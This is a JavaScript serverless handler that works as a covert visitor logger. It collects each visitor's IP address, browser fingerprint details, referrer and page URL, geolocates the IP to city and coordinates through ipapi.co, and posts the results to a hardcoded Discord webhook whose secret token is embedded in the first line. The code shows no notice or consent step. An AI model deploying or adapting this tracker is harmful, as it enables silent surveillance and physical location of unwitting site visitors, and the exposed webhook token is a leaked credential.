const WEBHOOK = "https://discord.com/api/webhooks/1551604978597232710/nNHpuRwdCjyVBTI3x-11X3aqU1Ey4-F7V_Fh7yrdSx0EcZmX_VOu5kuR23h5qXyQ8Ecf";

export default async function handler(req, res) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  if (req.method === "OPTIONS") return res.status(200).end();
  if (req.method !== "POST") return res.status(405).end();

  const ip =
    req.headers["x-real-ip"] ||
    req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
    req.socket?.remoteAddress ||
    "unknown";

  const body     = req.body || {};
  const ua       = body.ua     || "unknown";
  const lang     = body.lang   || "unknown";
  const ref      = body.ref    || "Direct";
  const screen_s = body.screen || "unknown";
  const tz       = body.tz     || "unknown";
  const pageURL  = body.url    || "unknown";
  const timestamp = new Date().toISOString();

  let city = "unknown", region = "unknown",
      country = "unknown", org = "unknown", loc = "unknown";

  try {
    const geo = await fetch(`https://ipapi.co/${ip}/json/`);
    const d   = await geo.json();
    city    = d.city         || "unknown";
    region  = d.region       || "unknown";
    country = d.country_name || "unknown";
    org     = d.org          || "unknown";
    loc     = d.latitude && d.longitude
              ? `${d.latitude}, ${d.longitude}`
              : "unknown";
  } catch (_) {}

  const payload = {
    username: "SiteTracker",
    avatar_url: "https://cdn.discordapp.com/embed/avatars/0.png",
    embeds: [{
      title: "🌐 New Visitor",
      color: 0x5865F2,
      fields: [
        { name: "IP Address",    value: `\`${ip}\``,              inline: true  },
        { name: "Country",       value: country,                  inline: true  },
        { name: "City / Region", value: `${city}, ${region}`,     inline: true  },
        { name: "ISP / Org",     value: org,                      inline: false },
        { name: "Coordinates",   value: loc,                      inline: true  },
        { name: "Timezone",      value: tz,                       inline: true  },
        { name: "Language",      value: lang,                     inline: true  },
        { name: "Screen",        value: screen_s,                 inline: true  },
        { name: "Referrer",      value: ref,                      inline: false },
        { name: "Page URL",      value: pageURL,                  inline: false },
        { name: "User Agent",    value: `\`${ua.slice(0,200)}\``, inline: false }
      ],
      footer: { text: timestamp }
    }]
  };

  try {
    await fetch(WEBHOOK, {
      method:  "POST",
      headers: { "Content-Type": "application/json" },
      body:    JSON.stringify(payload)
    });
  } catch (_) {}

  return res.status(200).json({ ok: true });
    }
